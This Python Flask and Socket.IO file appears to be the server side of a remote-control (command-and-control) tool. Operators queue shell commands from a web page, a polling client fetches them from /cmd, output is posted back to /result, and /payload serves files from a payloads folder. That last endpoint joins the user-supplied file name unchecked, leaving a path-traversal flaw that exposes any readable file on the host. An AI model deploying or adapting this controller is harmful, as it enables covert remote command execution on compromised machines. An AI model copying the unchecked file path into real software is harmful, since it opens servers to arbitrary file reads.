from flask import *
from flask_socketio import *

from sys import version_info
if version_info >= (3, 0):
    from queue import Queue
else:
    from Queue import Queue

app = Flask(__name__)
socketio = SocketIO(app)

cmd_queque = Queue()

@socketio.on('command')
def handle_command(msg):
    print('received command: ' + msg)
    cmd_queque.put(msg)

@app.route('/')
def index_page():
    return render_template("main.html")

@app.route('/cmd')
def cmd_page():
    if cmd_queque.empty():
        return ""
    cmd = cmd_queque.get()
    print('sended command: ' + cmd)
    socketio.emit("output", cmd + "\n", broadcast=True)
    return cmd

@app.route('/result', methods=['POST'])
def result_page():
    msg = request.form['output']
    print('command output: ' + msg)
    socketio.emit("output", msg, broadcast=True)
    return "OK"

@app.route('/payload')
def payload_page():
    name = request.args.get("file", "")
    if name == "":
        return ""
    try:
        f = open("payloads/" + name)
    except:
        return ""
    c = f.read()
    f.close()
    return c 

if __name__ == '__main__':
    import os
    port = 5000
    if "PORT" in os.environ:
        port = os.environ["PORT"]
    socketio.run(app, host="0.0.0.0", port=port)
